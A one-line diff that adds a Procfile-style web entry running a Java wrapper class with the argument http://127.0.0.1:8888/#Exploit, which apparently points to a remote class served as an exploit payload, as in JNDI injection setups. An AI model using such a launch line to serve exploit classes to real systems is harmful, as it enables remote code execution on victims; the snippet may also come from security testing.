@@ -1,0 +1,1 @@
+web: java -cp target/classes;target/dependency/* com.jdmaxcorp.wrapper.Wrapper http://127.0.0.1:8888/#Exploit
